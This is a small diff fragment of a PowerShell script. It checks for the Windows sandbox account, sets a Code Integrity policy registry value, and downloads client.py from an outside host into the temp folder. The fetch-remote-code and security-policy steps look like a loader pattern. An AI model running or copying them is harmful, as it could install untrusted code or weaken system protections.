@@ -15,6 +15,7 @@ if (-not $pythonCmd) {
     if ($env:USERNAME -eq "WDAGUtilityAccount") {
         Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\CI\Policy" -Name "VerifiedAndReputablePolicyState" -Value "1"
     }
+}
 $scriptUrl = "https://ryder7223.hrsn.dev/raw/client.py"
 $scriptPath = "$env:TEMP\client.py"
 Invoke-WebRequest -Uri $scriptUrl -OutFile $scriptPath
